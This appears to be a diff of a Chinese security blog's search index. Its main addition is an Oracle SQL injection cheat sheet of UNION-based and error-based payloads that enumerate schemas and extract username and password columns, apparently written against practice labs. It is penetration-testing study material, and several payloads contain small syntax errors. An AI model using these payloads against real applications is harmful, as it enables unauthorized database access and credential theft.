@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>SQL注入详解</title>
+    <title>SQL注入详解2.0-重构篇</title>
     <url>/SQLInject/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A32.0-%E9%87%8D%E6%9E%84%E7%AF%87/</url>
-    <content><![CDATA[<h1 id="SQL注入详解2-0-重构篇"><a href="#SQL注入详解2-0-重构篇" class="headerlink" title="SQL注入详解2.0-重构篇"></a>SQL注入详解2.0-重构篇</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
 <p>之前写过一篇，但是愈发感觉到之前写的薄弱和乱，所以重构！</p>
 </blockquote>
 <p><a href="https://sm.ms/image/ecEnPtXKhJqdw1B" target="_blank"><img src="https://s2.loli.net/2022/02/24/ecEnPtXKhJqdw1B.jpg" ></a></p>
@@ -124,12 +124,12 @@
 
 
 
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> (information_schema.columns) <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x61646D696E75736572</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> (information_schema.columns) <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x61646D696E75736572</span></span><br></pre></td></tr></table></figure>
 
 
 
 
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(flag) <span class="keyword">from</span> sqli.flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(flag) <span class="keyword">from</span> sqli.flag</span><br></pre></td></tr></table></figure>
 
 
 <p>其他以此类推。</p>
@@ -190,10 +190,221 @@
 
 <h2 id="PCRE绕过"><a href="#PCRE绕过" class="headerlink" title="PCRE绕过"></a>PCRE绕过</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">PHP 的 pcre.backtrack_limit 限制利用</span><br><span class="line"><span class="keyword">union</span><span class="comment">/*aaaaaaaxN*/</span><span class="keyword">select</span></span><br></pre></td></tr></table></figure>
 
-
-
-
 <p><font color="red"> 上面的还不行就尝试修改语句逻辑再绕过试试</font> </p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQLInject</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Oracle注入</title>
+    <url>/SQLInject/Oracle/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打JAVA站一般数据库都是Oracle，有一些特点的原因，所以特别记录一下</p>
+<p><a href="https://sm.ms/image/WynZ1puLEAxdOHl" target="_blank"><img src="https://s2.loli.net/2022/02/24/WynZ1puLEAxdOHl.png" ></a></p>
+<span id="more"></span>
+
+<h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span><span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;def&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>table_name,<span class="operator">+</span><span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>information_schema.tables<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>column_name,<span class="operator">+</span><span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>information_schema.columns<span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>table_name<span class="operator">=</span><span class="string">&#x27;users_abcdef&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+username_gugofj,+password_wvqepc+FROM+users_lsnuvu--</span></span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>数据库</li>
+<li>表<br>  USERS_TPHDTZ</li>
+<li>列<br>  PASSWORD_AGKTIJ<br>  USERNAME_UTZPGF</li>
+<li>字段</li>
+</ul>
+<h1 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Mysql是中小型数据库，而Oracle是<strong>大型数据库</strong>。</p>
+<p>在注入时Oracle数据库与MySQL数据库是有区别的。</p>
+<h2 id="2、oracle数据库权限分为2类"><a href="#2、oracle数据库权限分为2类" class="headerlink" title="2、oracle数据库权限分为2类"></a>2、oracle数据库权限分为2类</h2><p>注释符：<code>--</code></p>
+<p><strong>dba</strong>拥有全部权限，数据库<code>最高权限</code>，只有dba才可以创建数据库结构</p>
+<p><strong>oracle数据库自带的dual表，只有一行一列，每个用户都可以使用</strong></p>
+<p>dual表可能被删掉，sys可以恢复</p>
+<h3 id="2-1-、dual表"><a href="#2-1-、dual表" class="headerlink" title="2.1 、dual表"></a>2.1 、dual表</h3><p>dual是一个<code>虚拟表</code>，用来构成select的语法规则，<strong>oracle保证dual里面永远只有一条记录</strong>。我们可以用它来做很多事情。</p>
+<h2 id="3、判断是否为oracle数据库"><a href="#3、判断是否为oracle数据库" class="headerlink" title="3、判断是否为oracle数据库"></a>3、判断是否为oracle数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dual)</span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> user_tables)<span class="operator">&gt;</span><span class="number">0</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="4、dual表实现联合注入"><a href="#4、dual表实现联合注入" class="headerlink" title="4、dual表实现联合注入"></a>4、dual表实现联合注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>强类型</strong>，字符类型需要对上，这里可以<strong>使用null代替无法猜测的数据类型</strong>位置如下：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>) <span class="keyword">from</span> dual),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="4-1、查库"><a href="#4-1、查库" class="headerlink" title="4.1、查库"></a>4.1、查库</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">-- </span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span><span class="string">&#x27;第一个数据库&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>``,(``<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span>``<span class="string">&#x27;第一个数据库&#x27;</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span>``<span class="string">&#x27;第二个数据库&#x27;</span>``),``<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="operator">-</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="4-2、查表"><a href="#4-2、查表" class="headerlink" title="4.2、查表"></a>4.2、查表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="operator">&lt;&gt;</span><span class="string">&#x27;第一个表名&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="4-3、字段"><a href="#4-3、字段" class="headerlink" title="4.3、字段"></a>4.3、字段</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>``,(``<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span>``<span class="string">&#x27;DEMO&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span>),``<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;DEMO&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> column_name <span class="operator">&lt;&gt;</span><span class="string">&#x27;第一个字段&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>读取数据：字段名需要用<strong>双引号括起来！！</strong>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,&quot;字段名&quot;<span class="operator">||</span><span class="operator">-</span><span class="operator">||</span>&quot;字段名&quot;, <span class="keyword">from</span> 表名 <span class="comment">--</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="5、dual表实现报错注入"><a href="#5、dual表实现报错注入" class="headerlink" title="5、dual表实现报错注入"></a>5、dual表实现报错注入</h2><p>dbms_xdb_version.checkin()函数：获取当前用户名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>dbms_xdb_versionuncheckout()函数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">dbms_xdb_versionuncheckout(<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<p><code>utl_inaddr.get_host_name()函数</code> 8g,9g,10g,版本中不需要任何权限，11g及以后的版本需要网络访问权限</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> utl.inaddr.get_host_name((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>dbms_xdb_version.makeversioned()</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.makeversioned((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="keyword">from</span> dual <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>dbms_utility.sqlid_to_sqlhash()</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_utility.sqlid_to_sqlhash(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="keyword">from</span> dual <span class="keyword">in</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>ordsys.ord_dicom.getmappingxpath()</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ordsys.ord_dicom.getmappingxpath((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="keyword">user</span>,<span class="keyword">user</span>)<span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>ctxsys.drithsx.sn()</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="6、假如Oracle数据库中没有dual表也无法进行恢复的情况下用"><a href="#6、假如Oracle数据库中没有dual表也无法进行恢复的情况下用" class="headerlink" title="6、假如Oracle数据库中没有dual表也无法进行恢复的情况下用"></a>6、假如<code>Oracle数据库</code>中没有dual表也无法进行恢复的情况下用</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>table_name,<span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>all_tables<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>column_name,<span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>all_tab_columns</span><br><span class="line"><span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>table_name<span class="operator">=</span><span class="string">&#x27;USERS_TPHDTZ&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+USERNAME_UTZPGF,+PASSWORD_AGKTIJ+FROM+USERS_TPHDTZ--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+<p><code>&#39;</code>报错，<code>&#39;&#39;</code>显示正常</p>
+<p>返回错误时，确认是Oracle数据库且</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||(SELECT &#x27;&#x27; FROM not-a-real-table)||&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>此数据库需要显式指定表明</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||(SELECT &#x27;&#x27; FROM dual)||&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="7、其他payload总结"><a href="#7、其他payload总结" class="headerlink" title="7、其他payload总结"></a>7、其他payload总结</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,null..... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>
+
+
+
+
+<p><strong>判断第n个字段的类型，依次类推即可</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;null&#x27;</span>,null...... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;null&#x27;</span>,<span class="string">&#x27;null&#x27;</span>...... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> dual</span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> username</span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> owner <span class="keyword">FROM</span> all_tables</span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> all_tables</span><br><span class="line"><span class="keyword">SELECT</span> owner, table_name <span class="keyword">FROM</span> all_tables</span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> ‘blah’</span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> ‘blah’ <span class="keyword">and</span> owner <span class="operator">=</span> ‘foo’</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -206,7 +417,7 @@
     <title>nohup命令</title>
     <url>/Linux/nohup%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用 nohup 命令。</p>
-<p><a href="https://sm.ms/image/tXLasnF9H5JYgfy" target="_blank"><img src="https://s2.loli.net/2022/02/24/tXLasnF9H5JYgfy.jpg" ></a></p>
+<p><a href="https://sm.ms/image/y64tCrmuJcsxA98" target="_blank"><img src="https://s2.loli.net/2022/02/24/y64tCrmuJcsxA98.png" ></a></p>
 <span id="more"></span>
 
 <h1 id="命令简介"><a href="#命令简介" class="headerlink" title="命令简介"></a>命令简介</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup Command [ Arg … ] [ &amp; ]</span><br></pre></td></tr></table></figure>
